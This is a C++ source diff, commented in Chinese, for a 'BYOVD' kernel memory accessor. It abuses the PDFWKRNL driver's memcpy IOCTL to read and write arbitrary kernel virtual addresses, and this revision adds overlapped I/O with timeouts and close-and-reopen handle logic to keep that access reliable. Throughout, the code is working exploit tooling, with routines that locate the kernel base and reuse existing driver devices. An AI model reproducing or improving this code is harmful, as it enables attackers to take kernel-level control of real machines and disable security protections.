@@ -1313,26 +1313,46 @@ bool KernelMemoryAccessor::WritePhysical(uint64_t physAddr, const void* inBuf, s
 //         同步 DeviceIoControl 永久阻塞, 导致主循环卡死 (非崩溃).
 //   修复: 使用 overlapped I/O + 2 秒超时, 超时后 CancelIoEx 取消 IRP,
 //         进入 10 秒冷却期跳过后续 IOCTL, 避免永久阻塞主循环.
+//   ★ BUILD 532 fix: PDFWKRNL 驱动只允许一个句柄 (第二个 CreateFileW 返回 err=5),
+//     改用 close-and-reopen: 关闭同步句柄, 用 FILE_FLAG_OVERLAPPED 重开.
 // ============================================================
-static HANDLE g_hPdfwOverlapped = INVALID_HANDLE_VALUE;  // overlapped 设备句柄
-static DWORD  g_ioctlCooldownUntil = 0;     // 冷却期截止 tick (期间跳过 IOCTL)
-static DWORD  g_ioctlTimeoutCount = 0;      // 累计超时次数 (诊断用)
-static DWORD  g_lastIoctlSuccessTick = 0;   // 最后一次成功 IOCTL tick
+static bool   g_overlappedActive = false;       // m_hDevice 是否为 overlapped 句柄
+static DWORD  g_ioctlCooldownUntil = 0;         // 冷却期截止 tick (期间跳过 IOCTL)
+static DWORD  g_ioctlTimeoutCount = 0;          // 累计超时次数 (诊断用)
+static DWORD  g_lastIoctlSuccessTick = 0;       // 最后一次成功 IOCTL tick
 
-// ★ BUILD 532: 打开 overlapped 设备句柄 (惰性初始化)
-//   PDFWKRNL 设备需用 FILE_FLAG_OVERLAPPED 打开才能使用 overlapped I/O
-static HANDLE GetPdfwOverlappedHandle(const wchar_t* devicePath) {
-    if (g_hPdfwOverlapped != INVALID_HANDLE_VALUE) return g_hPdfwOverlapped;
-    g_hPdfwOverlapped = CreateFileW(devicePath,
+// ★ BUILD 532 fix: 尝试将 m_hDevice 切换为 overlapped 句柄 (close-and-reopen)
+//   PDFWKRNL 驱动只允许一个句柄, 必须先关闭同步句柄再重开 overlapped
+//   成功: g_overlappedActive=true, m_hDevice 更新为 overlapped 句柄
+//   失败: 恢复同步句柄, g_overlappedActive=false (无超时保护, 但至少能工作)
+static bool TrySwitchToOverlapped(HANDLE& hDevice, const wchar_t* devicePath) {
+    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return false;
+    HANDLE hOld = hDevice;
+    // 先关闭同步句柄
+    CloseHandle(hOld);
+    // 用 FILE_FLAG_OVERLAPPED 重新打开
+    hDevice = CreateFileW(devicePath,
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
         nullptr, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, nullptr);
-    if (g_hPdfwOverlapped == INVALID_HANDLE_VALUE) {
-        ByovdDiag("BYOVD:OverlappedHandle: CreateFileW FAILED err=%u\n", GetLastError());
-    } else {
-        ByovdDiag("BYOVD:OverlappedHandle: opened OK (FILE_FLAG_OVERLAPPED)\n");
+    if (hDevice != INVALID_HANDLE_VALUE) {
+        g_overlappedActive = true;
+        ByovdDiag("BYOVD:OverlappedSwitch: OK (FILE_FLAG_OVERLAPPED), timeout protection active\n");
+        return true;
     }
-    return g_hPdfwOverlapped;
+    // 重开失败 — 回退到同步句柄
+    DWORD err = GetLastError();
+    hDevice = CreateFileW(devicePath,
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        nullptr, OPEN_EXISTING, 0, nullptr);
+    if (hDevice != INVALID_HANDLE_VALUE) {
+        ByovdDiag("BYOVD:OverlappedSwitch: FAILED err=%u, restored synchronous handle\n", err);
+    } else {
+        ByovdDiag("BYOVD:OverlappedSwitch: CRITICAL — both overlapped and sync reopen failed err=%u\n", GetLastError());
+    }
+    g_overlappedActive = false;
+    return false;
 }
 
 // ★ BUILD 532: 带超时的 IOCTL 调用 (overlapped I/O)
@@ -1416,22 +1436,19 @@ static bool PdfwReadKernelVA(HANDLE hDevice, uint64_t kernelVA, void* outBuf, si
     if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return false;
     if (size > 0x100000) return false; // 1MB 上限
 
-    // ★ BUILD 532: 优先使用 overlapped 句柄 (带超时), 回退到同步句柄
-    HANDLE hOv = (g_hPdfwOverlapped != INVALID_HANDLE_VALUE) ? g_hPdfwOverlapped : hDevice;
-
     PDFW_MEMCPY_REQUEST request = {};
     request.Destination = outBuf;      // 驱动将数据写到 outBuf
     request.Source = (void*)kernelVA;  // 从内核VA读取
     request.Size = (uint32_t)size;
 
-    if (hOv == g_hPdfwOverlapped) {
-        // overlapped 路径 — 2 秒超时
-        return PdfwIoctlWithTimeout(hOv, IOCTL_AMDPDFW_MEMCPY,
+    // ★ BUILD 532: g_overlappedActive=true 时使用 overlapped I/O + 超时
+    if (g_overlappedActive) {
+        return PdfwIoctlWithTimeout(hDevice, IOCTL_AMDPDFW_MEMCPY,
             &request, sizeof(request), 2000);
     }
-    // 回退: 同步路径 (overlapped 句柄打开失败时)
+    // 回退: 同步路径 (overlapped 不可用时)
     DWORD bytesReturned = 0;
-    BOOL ok = DeviceIoControl(hOv, IOCTL_AMDPDFW_MEMCPY,
+    BOOL ok = DeviceIoControl(hDevice, IOCTL_AMDPDFW_MEMCPY,
         &request, sizeof(request),
         &request, sizeof(request),
         &bytesReturned, nullptr);
@@ -1445,22 +1462,19 @@ static bool PdfwWriteKernelVA(HANDLE hDevice, uint64_t kernelVA, const void* inB
     if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return false;
     if (size > 0x100000) return false;
 
-    // ★ BUILD 532: 优先使用 overlapped 句柄 (带超时), 回退到同步句柄
-    HANDLE hOv = (g_hPdfwOverlapped != INVALID_HANDLE_VALUE) ? g_hPdfwOverlapped : hDevice;
-
     PDFW_MEMCPY_REQUEST request = {};
     request.Destination = (void*)kernelVA;  // 驱动将数据写到内核VA
     request.Source = (void*)inBuf;          // 从用户缓冲区读取
     request.Size = (uint32_t)size;
 
-    if (hOv == g_hPdfwOverlapped) {
-        // overlapped 路径 — 2 秒超时
-        return PdfwIoctlWithTimeout(hOv, IOCTL_AMDPDFW_MEMCPY,
+    // ★ BUILD 532: g_overlappedActive=true 时使用 overlapped I/O + 超时
+    if (g_overlappedActive) {
+        return PdfwIoctlWithTimeout(hDevice, IOCTL_AMDPDFW_MEMCPY,
             &request, sizeof(request), 2000);
     }
-    // 回退: 同步路径 (overlapped 句柄打开失败时)
+    // 回退: 同步路径 (overlapped 不可用时)
     DWORD bytesReturned = 0;
-    BOOL ok = DeviceIoControl(hOv, IOCTL_AMDPDFW_MEMCPY,
+    BOOL ok = DeviceIoControl(hDevice, IOCTL_AMDPDFW_MEMCPY,
         &request, sizeof(request),
         &request, sizeof(request),
         &bytesReturned, nullptr);
@@ -1654,8 +1668,8 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
             if (probeOk && magic == 0x5A4D) {
                 ByovdDiag("BYOVD:Init: reusing existing device OK (ntos=0x%llX), skip cleanup+load\n",
                     (unsigned long long)m_ntosBase);
-                // ★ BUILD 532: 打开 overlapped 句柄用于超时保护
-                if (g_isPdfwKrnl) GetPdfwOverlappedHandle(m_driverInfo.devicePath);
+                // ★ BUILD 532: 切换为 overlapped 句柄用于超时保护 (close-and-reopen)
+                if (g_isPdfwKrnl) TrySwitchToOverlapped(m_hDevice, m_driverInfo.devicePath);
                 return true;
             }
             ByovdDiag("BYOVD:Init: early probe IOCTL FAIL (magic=0x%04X), device=zombie\n", magic);
@@ -1841,8 +1855,8 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
             if (probeOk && magic == 0x5A4D) {
                 ByovdDiag("BYOVD:Init: reusing existing device OK (ntos=0x%llX, ioctl=0x%08X)\n",
                     (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);
-                // ★ BUILD 532: 打开 overlapped 句柄用于超时保护
-                if (g_isPdfwKrnl) GetPdfwOverlappedHandle(m_driverInfo.devicePath);
+                // ★ BUILD 532: 切换为 overlapped 句柄用于超时保护 (close-and-reopen)
+                if (g_isPdfwKrnl) TrySwitchToOverlapped(m_hDevice, m_driverInfo.devicePath);
                 return true;
             }
             ByovdDiag("BYOVD:Init: existing device kernel read FAILED (magic=0x%04X)\n", magic);
@@ -1954,8 +1968,8 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
                     if (probeOk && magic == 0x5A4D) {
                         ByovdDiag("BYOVD:Init: zombie device IOCTL OK (ntos=0x%llX, ioctl=0x%08X)\n",
                             (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);
-                        // ★ BUILD 532: 打开 overlapped 句柄用于超时保护
-                        if (g_isPdfwKrnl) GetPdfwOverlappedHandle(m_driverInfo.devicePath);
+                        // ★ BUILD 532: 切换为 overlapped 句柄用于超时保护 (close-and-reopen)
+                        if (g_isPdfwKrnl) TrySwitchToOverlapped(m_hDevice, m_driverInfo.devicePath);
                         return true;
                     }
                     ByovdDiag("BYOVD:Init: zombie device IOCTL FAILED (magic=0x%04X)\n", magic);
@@ -2100,8 +2114,8 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
     ByovdDiag("BYOVD:Init: IOCTL verify OK\n");
     ByovdDiag("BYOVD:Init: STEP_F returning true (success, useVirtual=%d)\n", (int)g_useVirtualIOCTL);
 
-    // ★ BUILD 532: 打开 overlapped 句柄用于超时保护
-    if (g_isPdfwKrnl) GetPdfwOverlappedHandle(m_driverInfo.devicePath);
+    // ★ BUILD 532: 切换为 overlapped 句柄用于超时保护 (close-and-reopen)
+    if (g_isPdfwKrnl) TrySwitchToOverlapped(m_hDevice, m_driverInfo.devicePath);
 
     return true;
 }
@@ -2120,11 +2134,8 @@ void KernelMemoryAccessor::Shutdown() {
         CloseHandle(m_hDevice);
         m_hDevice = INVALID_HANDLE_VALUE;
     }
-    // ★ BUILD 532: 关闭 overlapped 句柄
-    if (g_hPdfwOverlapped != INVALID_HANDLE_VALUE) {
-        CloseHandle(g_hPdfwOverlapped);
-        g_hPdfwOverlapped = INVALID_HANDLE_VALUE;
-    }
+    // ★ BUILD 532: overlapped 句柄与 m_hDevice 同一 (close-and-reopen), 无需单独清理
+    g_overlappedActive = false;
     ByovdDiag("BYOVD:Shutdown: driver kept loaded for next reuse\n");
 }
 
